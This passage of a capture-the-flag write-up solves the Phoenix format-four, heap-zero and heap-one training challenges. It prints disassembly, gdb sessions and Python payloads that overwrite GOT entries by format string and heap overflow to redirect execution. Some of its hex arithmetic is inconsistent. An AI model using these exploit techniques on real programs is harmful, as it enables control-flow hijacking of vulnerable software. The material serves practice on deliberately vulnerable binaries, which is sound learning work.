 80483e6:       74 28                   je     8048410 <register_tm_clones+0x40>
 80483e8:       ba 00 00 00 00          mov    $0x0,%edx
 80483ed:       85 d2                   test   %edx,%edx
 80483ef:       74 1f                   je     8048410 <register_tm_clones+0x40>
 80483f1:       55                      push   %ebp
 80483f2:       89 e5                   mov    %esp,%ebp
 80483f4:       83 ec 10                sub    $0x10,%esp
 80483f7:       50                      push   %eax
 80483f8:       68 f0 97 04 08          push   $0x80497f0
 80483fd:       ff d2                   call   *%edx
 80483ff:       83 c4 10                add    $0x10,%esp
 8048402:       c9                      leave  
 8048403:       c3                      ret    
 8048404:       8d b6 00 00 00 00       lea    0x0(%esi),%esi
 804840a:       8d bf 00 00 00 00       lea    0x0(%edi),%edi
 8048410:       c3                      ret    
 8048411:       eb 0d                   jmp    8048420 <__do_global_dtors_aux>
 8048413:       90                      nop
 8048414:       90                      nop
 8048415:       90                      nop
 8048416:       90                      nop
 8048417:       90                      nop
 8048418:       90                      nop
 8048419:       90                      nop
 804841a:       90                      nop
 804841b:       90                      nop
 804841c:       90                      nop
 804841d:       90                      nop
 804841e:       90                      nop
 804841f:       90                      nop

08048420 <__do_global_dtors_aux>:
 8048420:       80 3d f0 97 04 08 00    cmpb   $0x0,0x80497f0
 8048427:       75 67                   jne    8048490 <__do_global_dtors_aux+0x70>
 8048429:       55                      push   %ebp
 804842a:       89 e5                   mov    %esp,%ebp
 804842c:       56                      push   %esi
 804842d:       53                      push   %ebx
 804842e:       bb 28 97 04 08          mov    $0x8049728,%ebx
 8048433:       81 eb 24 97 04 08       sub    $0x8049724,%ebx
 8048439:       c1 fb 02                sar    $0x2,%ebx
 804843c:       4b                      dec    %ebx
 804843d:       be 24 97 04 08          mov    $0x8049724,%esi
 8048442:       a1 f4 97 04 08          mov    0x80497f4,%eax
 8048447:       39 d8                   cmp    %ebx,%eax
 8048449:       73 17                   jae    8048462 <__do_global_dtors_aux+0x42>
 804844b:       90                      nop
 804844c:       8d 74 26 00             lea    0x0(%esi,%eiz,1),%esi
 8048450:       40                      inc    %eax
 8048451:       a3 f4 97 04 08          mov    %eax,0x80497f4
 8048456:       ff 14 86                call   *(%esi,%eax,4)
 8048459:       a1 f4 97 04 08          mov    0x80497f4,%eax
 804845e:       39 d8                   cmp    %ebx,%eax
 8048460:       72 ee                   jb     8048450 <__do_global_dtors_aux+0x30>
 8048462:       e8 29 ff ff ff          call   8048390 <deregister_tm_clones>
 8048467:       b8 00 00 00 00          mov    $0x0,%eax
 804846c:       85 c0                   test   %eax,%eax
 804846e:       74 10                   je     8048480 <__do_global_dtors_aux+0x60>
 8048470:       83 ec 0c                sub    $0xc,%esp
 8048473:       68 b4 86 04 08          push   $0x80486b4
 8048478:       e8 83 7b fb f7          call   0 <_init-0x80482d8>
 804847d:       83 c4 10                add    $0x10,%esp
 8048480:       c6 05 f0 97 04 08 01    movb   $0x1,0x80497f0
 8048487:       8d 65 f8                lea    -0x8(%ebp),%esp
 804848a:       5b                      pop    %ebx
 804848b:       5e                      pop    %esi
 804848c:       5d                      pop    %ebp
 804848d:       c3                      ret    
 804848e:       66 90                   xchg   %ax,%ax
 8048490:       c3                      ret    
 8048491:       eb 0d                   jmp    80484a0 <frame_dummy>
 8048493:       90                      nop
 8048494:       90                      nop
 8048495:       90                      nop
 8048496:       90                      nop
 8048497:       90                      nop
 8048498:       90                      nop
 8048499:       90                      nop
 804849a:       90                      nop
 804849b:       90                      nop
 804849c:       90                      nop
 804849d:       90                      nop
 804849e:       90                      nop
 804849f:       90                      nop

080484a0 <frame_dummy>:
 80484a0:       e8 00 00 00 00          call   80484a5 <frame_dummy+0x5>
 80484a5:       5a                      pop    %edx
 80484a6:       81 c2 27 13 00 00       add    $0x1327,%edx
 80484ac:       b8 00 00 00 00          mov    $0x0,%eax
 80484b1:       85 c0                   test   %eax,%eax
 80484b3:       74 2b                   je     80484e0 <frame_dummy+0x40>
 80484b5:       55                      push   %ebp
 80484b6:       89 e5                   mov    %esp,%ebp
 80484b8:       83 ec 08                sub    $0x8,%esp
 80484bb:       52                      push   %edx
 80484bc:       6a 00                   push   $0x0
 80484be:       68 f8 97 04 08          push   $0x80497f8
 80484c3:       68 b4 86 04 08          push   $0x80486b4
 80484c8:       e8 33 7b fb f7          call   0 <_init-0x80482d8>
 80484cd:       83 c4 10                add    $0x10,%esp
 80484d0:       c9                      leave  
 80484d1:       e9 fa fe ff ff          jmp    80483d0 <register_tm_clones>
 80484d6:       8d 76 00                lea    0x0(%esi),%esi
 80484d9:       8d bc 27 00 00 00 00    lea    0x0(%edi,%eiz,1),%edi
 80484e0:       e9 eb fe ff ff          jmp    80483d0 <register_tm_clones>

080484e5 <bounce>:
 80484e5:       55                      push   %ebp
 80484e6:       89 e5                   mov    %esp,%ebp
 80484e8:       83 ec 08                sub    $0x8,%esp
 80484eb:       83 ec 0c                sub    $0xc,%esp
 80484ee:       ff 75 08                pushl  0x8(%ebp)
 80484f1:       e8 0a fe ff ff          call   8048300 <printf@plt>
 80484f6:       83 c4 10                add    $0x10,%esp
 80484f9:       83 ec 0c                sub    $0xc,%esp
 80484fc:       6a 00                   push   $0x0
 80484fe:       e8 2d fe ff ff          call   8048330 <exit@plt>

08048503 <congratulations>:
 8048503:       55                      push   %ebp
 8048504:       89 e5                   mov    %esp,%ebp
 8048506:       83 ec 08                sub    $0x8,%esp
 8048509:       83 ec 0c                sub    $0xc,%esp
 804850c:       68 d0 85 04 08          push   $0x80485d0
 8048511:       e8 fa fd ff ff          call   8048310 <puts@plt>
 8048516:       83 c4 10                add    $0x10,%esp
 8048519:       83 ec 0c                sub    $0xc,%esp
 804851c:       6a 00                   push   $0x0
 804851e:       e8 0d fe ff ff          call   8048330 <exit@plt>

08048523 <main>:
 8048523:       8d 4c 24 04             lea    0x4(%esp),%ecx
 8048527:       83 e4 f0                and    $0xfffffff0,%esp
 804852a:       ff 71 fc                pushl  -0x4(%ecx)
 804852d:       55                      push   %ebp
 804852e:       89 e5                   mov    %esp,%ebp
 8048530:       51                      push   %ecx
 8048531:       81 ec 04 10 00 00       sub    $0x1004,%esp
 8048537:       83 ec 0c                sub    $0xc,%esp
 804853a:       68 00 86 04 08          push   $0x8048600
 804853f:       e8 cc fd ff ff          call   8048310 <puts@plt>
 8048544:       83 c4 10                add    $0x10,%esp
 8048547:       83 ec 04                sub    $0x4,%esp
 804854a:       68 ff 0f 00 00          push   $0xfff
 804854f:       8d 85 f8 ef ff ff       lea    -0x1008(%ebp),%eax
 8048555:       50                      push   %eax
 8048556:       6a 00                   push   $0x0
 8048558:       e8 c3 fd ff ff          call   8048320 <read@plt>
 804855d:       83 c4 10                add    $0x10,%esp
 8048560:       85 c0                   test   %eax,%eax
 8048562:       7f 0a                   jg     804856e <main+0x4b>
 8048564:       83 ec 0c                sub    $0xc,%esp
 8048567:       6a 01                   push   $0x1
 8048569:       e8 c2 fd ff ff          call   8048330 <exit@plt>
 804856e:       83 ec 0c                sub    $0xc,%esp
 8048571:       8d 85 f8 ef ff ff       lea    -0x1008(%ebp),%eax
 8048577:       50                      push   %eax
 8048578:       e8 68 ff ff ff          call   80484e5 <bounce>
 804857d:       83 c4 10                add    $0x10,%esp
 8048580:       b8 00 00 00 00          mov    $0x0,%eax
 8048585:       8b 4d fc                mov    -0x4(%ebp),%ecx
 8048588:       c9                      leave  
 8048589:       8d 61 fc                lea    -0x4(%ecx),%esp
 804858c:       c3                      ret    
 804858d:       66 90                   xchg   %ax,%ax
 804858f:       90                      nop

08048590 <__do_global_ctors_aux>:
 8048590:       a1 1c 97 04 08          mov    0x804971c,%eax
 8048595:       83 f8 ff                cmp    $0xffffffff,%eax
 8048598:       74 26                   je     80485c0 <__do_global_ctors_aux+0x30>
 804859a:       55                      push   %ebp
 804859b:       89 e5                   mov    %esp,%ebp
 804859d:       53                      push   %ebx
 804859e:       52                      push   %edx
 804859f:       bb 1c 97 04 08          mov    $0x804971c,%ebx
 80485a4:       8d b6 00 00 00 00       lea    0x0(%esi),%esi
 80485aa:       8d bf 00 00 00 00       lea    0x0(%edi),%edi
 80485b0:       ff d0                   call   *%eax
 80485b2:       83 eb 04                sub    $0x4,%ebx
 80485b5:       8b 03                   mov    (%ebx),%eax
 80485b7:       83 f8 ff                cmp    $0xffffffff,%eax
 80485ba:       75 f4                   jne    80485b0 <__do_global_ctors_aux+0x20>
 80485bc:       58                      pop    %eax
 80485bd:       5b                      pop    %ebx
 80485be:       5d                      pop    %ebp
 80485bf:       c3                      ret    
 80485c0:       c3                      ret    

Disassembly of section .fini:

080485c1 <_fini>:
 80485c1:       83 ec 0c                sub    $0xc,%esp
 80485c4:       e8 57 fe ff ff          call   8048420 <__do_global_dtors_aux>
 80485c9:       83 c4 0c                add    $0xc,%esp
 80485cc:       c3                      ret    
```

Now that we got those values we can write a script that puts the exit function's GOT address on the stack in a location for us to change the value to the congratulations function's location. Using the script below shows us that we can put the exit function's address on the stack we need 11 "%x"s before our "%n".

```python
padding = "\xe4\x97\x04\x08" + "%x,"*17
print(padding)
```

```bash
user@phoenix-amd64:~$ python format-four.py | /opt/phoenix/i486/format-four 
Welcome to phoenix/format-four, brought to you by https://exploit.education
�0,0,0,f7f81cf7,f7ffb000,ffffd748,804857d,ffffc740,ffffc740,fff,0,80497e4,252c7825,78252c78,2c78252c,252c7825,78252c78,
```

Now we will make a script that changes the exit function's address's value. We will see what happens with our change with gdb. Using gdb we disassemble the bounce function and place a breakpoint at the end of the function when the exit function is called. Running the program with out script as the input we get to the breakpoint. After stepping through the program a bit we stop, because the eip enters a weird location that location is 0x0000003a. This means that our script does override the exit functions location with our own. Now we can do the same math we did with the last challenge to put the value we want into the address we want.

```python
padding = "\xe4\x97\x04\x08" + "%x"*11 + "%n"
print(padding)
```

```bash
user@phoenix-amd64:~$ python format-four.py > /tmp/test
user@phoenix-amd64:~$ gdb /opt/phoenix/i486/format-four
(gdb) disas bounce
Dump of assembler code for function bounce:
   0x080484e5 <+0>:     push   ebp
   0x080484e6 <+1>:     mov    ebp,esp
   0x080484e8 <+3>:     sub    esp,0x8
   0x080484eb <+6>:     sub    esp,0xc
   0x080484ee <+9>:     push   DWORD PTR [ebp+0x8]
   0x080484f1 <+12>:    call   0x8048300 <printf@plt>
   0x080484f6 <+17>:    add    esp,0x10
   0x080484f9 <+20>:    sub    esp,0xc
   0x080484fc <+23>:    push   0x0
   0x080484fe <+25>:    call   0x8048330 <exit@plt>
End of assembler dump.
(gdb) break *0x080484fe
Breakpoint 1 at 0x80484fe
(gdb) r < /tmp/test 
Starting program: /opt/phoenix/i486/format-four < /tmp/test
Welcome to phoenix/format-four, brought to you by https://exploit.education
�000f7f81cf7f7ffb000ffffd748804857dffffc740ffffc740fff0

Breakpoint 1, 0x080484fe in bounce ()
(gdb) si
0x08048330 in exit@plt ()
(gdb) si
0x0000003a in ?? ()
(gdb) x/b $eip
0x3a:   Cannot access memory at address 0x3a
```

We now create a script like last time that changes the value at each 2 bytes of the address we the exit function to be. Running this and checking where exit function goes with gdb we get the 0x46464646 as the location. Now we need to do the padding math to pad each section with As to get the values we want.

```python
padding = "\xe4\x97\x04\x08" + "\xe5\x97\x04\x08" + "\xe6\x97\x04\x08" + "\xe7\x97\x04\x08" + "%x"*11 + "%n" + "%n" + "%n" + "%n"
print(padding)
```

```bash
(gdb) r < /tmp/test 
Starting program: /opt/phoenix/i486/format-four < /tmp/test
Welcome to phoenix/format-four, brought to you by https://exploit.education
����000f7f81cf7f7ffb000ffffd748804857dffffc740ffffc740fff0

Breakpoint 1, 0x080484fe in bounce ()
(gdb) si
0x08048330 in exit@plt ()
(gdb) 
0x46464646 in ?? ()
(gdb) x/b $eip
0x46464646:     Cannot access memory at address 0x46464646
```

We need 03 as the value for the first 2 bytes so using the math, 103 - 46 = BD. We got BD in hex which is 189 decimal, so we need to have 189 As before the first "%n". Checking our script with gdb gets us 0x03030303, which means we did it. We got what we want for the first 2 bytes.

```python
padding = "\xe4\x97\x04\x08" + "\xe5\x97\x04\x08" + "\xe6\x97\x04\x08" + "\xe4\x97\x04\x08" + "%x"*11 + "A"*189  + "%n" + "%n" + "%n" + "%n"
print(padding)
```

```bash
(gdb) r < /tmp/test 
Starting program: /opt/phoenix/i486/format-four < /tmp/test
Welcome to phoenix/format-four, brought to you by https://exploit.education
����000f7f81cf7f7ffb000ffffd748804857dffffc740ffffc740fff0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x080484fe in bounce ()
(gdb) si
0x08048330 in exit@plt ()
(gdb) 
0x03030303 in ?? ()
(gdb) x/b $eip
0x3030303:      Cannot access memory at address 0x3030303
```

We need 85 as the value for the next 2 bytes so using the math, 85 - 03 = 82. We got 83 in hex which is 130 decimal, so we need to have 130 As before the second "%n". Checking our script with gdb gets us 0x85858503, which means we did it. We got what we want for the next 2 bytes.

```python
padding = "\xe4\x97\x04\x08" + "\xe5\x97\x04\x08" + "\xe6\x97\x04\x08" + "\xe4\x97\x04\x08" + "%x"*11 + "A"*189  + "%n" + "A"*130 + "%n" + "%n" + "%n"
print(padding)
```

```bash
(gdb) r < /tmp/test 
Starting program: /opt/phoenix/i486/format-four < /tmp/test
Welcome to phoenix/format-four, brought to you by https://exploit.education
����000f7f81cf7f7ffb000ffffd748804857dffffc740ffffc740fff0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x080484fe in bounce ()
(gdb) si
0x08048330 in exit@plt ()
(gdb) 
0x85858503 in ?? ()
(gdb) x/b $eip
0x85858503:     Cannot access memory at address 0x85858503
```

We need 04 as the value for the next 2 bytes so using the math, 104 - 85 = 7F. We got 7F in hex which is 127 decimal, so we need to have 127 As before the third "%n". Checking our script with gdb gets us 0x4048503, which means we did it. We got what we want for the those 2 bytes.

```python
padding = "\xe4\x97\x04\x08" + "\xe5\x97\x04\x08" + "\xe6\x97\x04\x08" + "\xe4\x97\x04\x08" + "%x"*11 + "A"*189  + "%n" + "A"*130 + "%n" + "A"*127 + "%n" + "%n"
print(padding)
```

```bash
(gdb) r < /tmp/test 
Starting program: /opt/phoenix/i486/format-four < /tmp/test
Welcome to phoenix/format-four, brought to you by https://exploit.education
����000f7f81cf7f7ffb000ffffd748804857dffffc740ffffc740fff0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x080484fe in bounce ()
(gdb) si
0x08048330 in exit@plt ()
(gdb) 
0x04048503 in ?? ()
(gdb) x/b $eip
0x4048503:     Cannot access memory at address 0x4048503
```

Lastly we need 08 as the value for the final 2 bytes so using the math, 08 - 04 = 04. We got 04 in hex the same in decimal, so we need to have 4 As before the final "%n". After that our script is done and running the program we execute the congratulations function solving the challenge.

### Solved

```python
padding = "\xe4\x97\x04\x08" + "\xe5\x97\x04\x08" + "\xe6\x97\x04\x08" + "\xe4\x97\x04\x08" + "%x"*11 + "A"*189  + "%n" + "A"*130 + "%n" + "A"*127 + "%n" + "A"*4 + "%n"
print(padding)
```

```bash
user@phoenix-amd64:~$ python format-four.py | /opt/phoenix/i486/format-four 
Welcome to phoenix/format-four, brought to you by https://exploit.education
����000f7f81cf7f7ffb000ffffd748804857dffffc740ffffc740fff0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, you're redirected code execution!
```

## Challenge 13 - Heap Zero

[Heap Zero Code](https://exploit.education/phoenix/heap-zero/). 

This challenge is like a the challenge 4, Stack Three. Unlike that challenge we are not doing a stack overflow but a heap overflow. Overflowing the heap is just the same as the stack, but the heap can be harder due how things are placed on it. For this challenge though we can easily overwrite the heap by being able to place a large string on there using the strcpy function. Creating a function with is the alphabet and using that as the command argument. We find that the program tried calling the function 0x504f4f4f, which in ASCII is QQQQQRRR. We now know that we need to place the address location of the winner function at that location in our script. To get the address of the winner function we use objdump, which gets us 08048835. Once we had that in place of QQQQQRRR and run our the program with our script. The solution is found and the problem is solved.

```python
padding = "AAAAABBBBBCCCCCDDDDDEEEEEFFFFFGGGGGHHHHHIIIIIJJJJJKKKKKLLLLLMMMMMNNNNNOOOOOPPPPPQQQQQRRRRRSSSSSTTTTTUUUUUVVVVVWWWWWXXXXXYYYYYZZZZZ"
print(padding)
```

```bash
user@phoenix-amd64:~$ /opt/phoenix/i486/heap-zero $(python heap-zero.py)
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x504f4f4f
Segmentation fault
user@phoenix-amd64:~$ objdump -d /opt/phoenix/i486/heap-zero | grep winner
08048835 <winner>:
0804884e <nowinner>:
```

### Solved


```python
padding = "AAAAABBBBBCCCCCDDDDDEEEEEFFFFFGGGGGHHHHHIIIIIJJJJJKKKKKLLLLLMMMMMNNNNNOO"
rip = "\x35\x88\x04\x08"
print(padding+rip)
```

```bash
user@phoenix-amd64:~$ /opt/phoenix/i486/heap-zero $(python heap-zero.py)
Welcome to phoenix/heap-zero, brought to you by https://exploit.education
data is at 0xf7e69008, fp is at 0xf7e69050, will be calling 0x8048835
Congratulations, you have passed this level
```

## Challenge 14 - Heap One

[Heap One Code](https://exploit.education/phoenix/heap-one/). 

Testing out the program we can already tell that the first value is overflowing on the heap. We will need to use gdb to find out what is being overwritten by argument one.

```bash
user@phoenix-amd64:~$ /opt/phoenix/i486/heap-one AAAA BBBB
and that's a wrap folks!
user@phoenix-amd64:~$ /opt/phoenix/i486/heap-one AAAAAAAAAAAAAAAAAAAAAAAAAAA BBBB
Segmentation fault
```

We using gdb to check what is happening. Sending it the alphabet can tell us where in the string things are getting overwritten. Running the program with the given arguments causes the program to crash with a segmentation fault. Checking the esi or the source index we see that it's address is overwritten by 58575655, which is UVWX. This means we change it to any address we want. We also know where in out argument to do so. The question is what address do we want.  We can change it to an GOT address like we did for challenge 12 or Format Four. Now we need to decide which to overwrite. After the second strcpy the only function that is called is a printf. The problem is if you disassemble the main function in gdb the compiler changes the printf call to a puts, because it optimized the program when compiling. So, we need to get the GOT address for the puts function and overwrite it's value with the location of the winner function. Using objdump will get us both values we need. 0804c140 is the puts function GOT address and 0804889a is the winner functions location. Now we just need to replace UVWX in the first argument with 0804c140 and in the second argument we put 0804889a. This will solve the challenge.

```bash
user@phoenix-amd64:~$ gdb /opt/phoenix/i486/heap-one 
(gdb) r ABCDEFGHIJKLMNOPQRSTUVWXYZ AAAABBBBCCCCDDDD
Starting program: /opt/phoenix/i486/heap-one ABCDEFGHIJKLMNOPQRSTUVWXYZ AAAABBBBCCCCDDDD

Program received signal SIGSEGV, Segmentation fault.
0xf7f840db in stpcpy () from /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1
(gdb) break *0xf7f840db
Breakpoint 2 at 0xf7f840db
(gdb) x/b $esi
0x58575655:     Cannot access memory at address 0x58575655
(gdb) backtrace
#0  0xf7f840db in stpcpy () from /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1
#1  0xf7f8453e in strcpy () from /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1
#2  0x00000008 in ?? ()
#3  0x00000008 in ?? ()
#4  0xf7f84527 in strcpy () from /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1
#5  0x08048878 in main ()
(gdb) disas main
Dump of assembler code for function main:
   0x080487d5 <+0>:     lea    ecx,[esp+0x4]
   0x080487d9 <+4>:     and    esp,0xfffffff0
   0x080487dc <+7>:     push   DWORD PTR [ecx-0x4]
   0x080487df <+10>:    push   ebp
   0x080487e0 <+11>:    mov    ebp,esp
   0x080487e2 <+13>:    push   ebx
   0x080487e3 <+14>:    push   ecx
   0x080487e4 <+15>:    sub    esp,0x10
   0x080487e7 <+18>:    mov    ebx,ecx
   0x080487e9 <+20>:    sub    esp,0xc
   0x080487ec <+23>:    push   0x8
   0x080487ee <+25>:    call   0x80490dc <malloc>
   0x080487f3 <+30>:    add    esp,0x10
   0x080487f6 <+33>:    mov    DWORD PTR [ebp-0xc],eax
   0x080487f9 <+36>:    mov    eax,DWORD PTR [ebp-0xc]
   0x080487fc <+39>:    mov    DWORD PTR [eax],0x1
   0x08048802 <+45>:    sub    esp,0xc
   0x08048805 <+48>:    push   0x8
   0x08048807 <+50>:    call   0x80490dc <malloc>
   0x0804880c <+55>:    add    esp,0x10
   0x0804880f <+58>:    mov    edx,eax
   0x08048811 <+60>:    mov    eax,DWORD PTR [ebp-0xc]
   0x08048814 <+63>:    mov    DWORD PTR [eax+0x4],edx
   0x08048817 <+66>:    sub    esp,0xc
   0x0804881a <+69>:    push   0x8
   0x0804881c <+71>:    call   0x80490dc <malloc>
   0x08048821 <+76>:    add    esp,0x10
   0x08048824 <+79>:    mov    DWORD PTR [ebp-0x10],eax
   0x08048827 <+82>:    mov    eax,DWORD PTR [ebp-0x10]
   0x0804882a <+85>:    mov    DWORD PTR [eax],0x2
   0x08048830 <+91>:    sub    esp,0xc
   0x08048833 <+94>:    push   0x8
   0x08048835 <+96>:    call   0x80490dc <malloc>
   0x0804883a <+101>:   add    esp,0x10
   0x0804883d <+104>:   mov    edx,eax
   0x0804883f <+106>:   mov    eax,DWORD PTR [ebp-0x10]
   0x08048842 <+109>:   mov    DWORD PTR [eax+0x4],edx
   0x08048845 <+112>:   mov    eax,DWORD PTR [ebx+0x4]
   0x08048848 <+115>:   add    eax,0x4
   0x0804884b <+118>:   mov    edx,DWORD PTR [eax]
   0x0804884d <+120>:   mov    eax,DWORD PTR [ebp-0xc]
   0x08048850 <+123>:   mov    eax,DWORD PTR [eax+0x4]
   0x08048853 <+126>:   sub    esp,0x8
   0x08048856 <+129>:   push   edx
   0x08048857 <+130>:   push   eax
   0x08048858 <+131>:   call   0x8048560 <strcpy@plt>
   0x0804885d <+136>:   add    esp,0x10
   0x08048860 <+139>:   mov    eax,DWORD PTR [ebx+0x4]
   0x08048863 <+142>:   add    eax,0x8
   0x08048866 <+145>:   mov    edx,DWORD PTR [eax]
   0x08048868 <+147>:   mov    eax,DWORD PTR [ebp-0x10]
   0x0804886b <+150>:   mov    eax,DWORD PTR [eax+0x4]
   0x0804886e <+153>:   sub    esp,0x8
   0x08048871 <+156>:   push   edx
   0x08048872 <+157>:   push   eax
   0x08048873 <+158>:   call   0x8048560 <strcpy@plt>
   0x08048878 <+163>:   add    esp,0x10
   0x0804887b <+166>:   sub    esp,0xc
   0x0804887e <+169>:   push   0x804ab70
   0x08048883 <+174>:   call   0x80485b0 <puts@plt>
   0x08048888 <+179>:   add    esp,0x10
   0x0804888b <+182>:   mov    eax,0x0
   0x08048890 <+187>:   lea    esp,[ebp-0x8]
   0x08048893 <+190>:   pop    ecx
   0x08048894 <+191>:   pop    ebx
   0x08048895 <+192>:   pop    ebp
   0x08048896 <+193>:   lea    esp,[ecx-0x4]
   0x08048899 <+196>:   ret    
End of assembler dump.
(gdb) quit
user@phoenix-amd64:~$ objdump -R /opt/phoenix/i486/heap-one 

/opt/phoenix/i486/heap-one:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
0804c180 R_386_COPY        stderr
0804c12c R_386_JUMP_SLOT   strcpy
0804c130 R_386_JUMP_SLOT   sysconf
0804c134 R_386_JUMP_SLOT   printf
0804c138 R_386_JUMP_SLOT   munmap
0804c13c R_386_JUMP_SLOT   memcpy
0804c140 R_386_JUMP_SLOT   puts
0804c144 R_386_JUMP_SLOT   mmap
0804c148 R_386_JUMP_SLOT   fprintf
0804c14c R_386_JUMP_SLOT   mremap
0804c150 R_386_JUMP_SLOT   sbrk
0804c154 R_386_JUMP_SLOT   memset
0804c158 R_386_JUMP_SLOT   time
0804c15c R_386_JUMP_SLOT   __errno_location
0804c160 R_386_JUMP_SLOT   __libc_start_main
user@phoenix-amd64:~$ objdump -t /opt/phoenix/i486/heap-one

/opt/phoenix/i486/heap-one:     file format elf32-i386

SYMBOL TABLE:
08048114 l    d  .interp        00000000 .interp
08048148 l    d  .hash  00000000 .hash
08048204 l    d  .dynsym        00000000 .dynsym
080483c4 l    d  .dynstr        00000000 .dynstr
080484c4 l    d  .rel.dyn       00000000 .rel.dyn
080484cc l    d  .rel.plt       00000000 .rel.plt
0804853c l    d  .init  00000000 .init
08048550 l    d  .plt   00000000 .plt
08048640 l    d  .text  00000000 .text
0804ab61 l    d  .fini  00000000 .fini
0804ab70 l    d  .rodata        00000000 .rodata
0804ac40 l    d  .eh_frame_hdr  00000000 .eh_frame_hdr
0804ad0c l    d  .eh_frame      00000000 .eh_frame
0804c058 l    d  .ctors 00000000 .ctors
0804c060 l    d  .dtors 00000000 .dtors
0804c068 l    d  .dynamic       00000000 .dynamic
0804c120 l    d  .got.plt       00000000 .got.plt
0804c164 l    d  .data  00000000 .data
0804c180 l    d  .bss   00000000 .bss
00000000 l    d  .comment       00000000 .comment
00000000 l    df *ABS*  00000000 crt1.c
00000000 l    df *ABS*  00000000 crtstuff.c
0804c058 l     O .ctors 00000000 __CTOR_LIST__
0804c060 l     O .dtors 00000000 __DTOR_LIST__
0804ad48 l     O .eh_frame      00000000 __EH_FRAME_BEGIN__
08048680 l     F .text  00000000 deregister_tm_clones
080486c0 l     F .text  00000000 register_tm_clones
08048710 l     F .text  00000000 __do_global_dtors_aux
0804c184 l     O .bss   00000001 completed.5195
0804c188 l     O .bss   00000004 dtor_idx.5197
08048790 l     F .text  00000000 frame_dummy
0804c18c l     O .bss   00000018 object.5207
00000000 l    df *ABS*  00000000 crtstuff.c
0804c05c l     O .ctors 00000000 __CTOR_END__
0804b054 l     O .eh_frame      00000000 __FRAME_END__
0804ab30 l     F .text  00000000 __do_global_ctors_aux
00000000 l    df *ABS*  00000000 heap-one.c
00000000 l    df *ABS*  00000000 malloc-2.7.2.c
080488c1 l     F .text  0000004e largebin_index
0804c1c0 l     O .bss   00000378 av_
0804890f l     F .text  000000d1 malloc_init_state
080489e0 l     F .text  0000061e sYSMALLOc
08049aca l     F .text  000001d7 malloc_consolidate
08048ffe l     F .text  000000de sYSTRIm
0804a4bf l     F .text  00000287 iALLOc
00000000 l    df *ABS*  00000000 
0804c068 l     O .dynamic       00000000 _DYNAMIC
0804ac40 l       .eh_frame_hdr  00000000 __GNU_EH_FRAME_HDR
0804c120 l     O .got.plt       00000000 _GLOBAL_OFFSET_TABLE_
00000000       F *UND*  00000000 strcpy
00000000       F *UND*  00000000 sysconf
00000000       F *UND*  00000000 printf
00000000       F *UND*  00000000 munmap
0804a9d9 g     F .text  00000076 malloc_stats
00000000       F *UND*  00000000 memcpy
0804c168 g     O .data  00000000 .hidden __TMC_END__
0804c064 g     O .dtors 00000000 .hidden __DTOR_END__
00000000       F *UND*  00000000 puts
080490dc g     F .text  0000076e malloc
0804c164 g     O .data  00000000 .hidden __dso_handle
0804a784 g     F .text  00000053 pvalloc
0804a482 g     F .text  00000022 independent_calloc
00000000       F *UND*  00000000 mmap
0804853c g     F .init  00000001 _init
0804a372 g     F .text  000000f9 calloc
0804a805 g     F .text  0000005f malloc_usable_size
00000000       F *UND*  00000000 fprintf
00000000       F *UND*  00000000 mremap
0804889a g     F .text  00000027 winner
08048640 g       .text  00000000 _start
0804865b g     F .text  00000023 _start_c
08049ca1 g     F .text  000004ad realloc
0804a7d7 g     F .text  0000002e malloc_trim
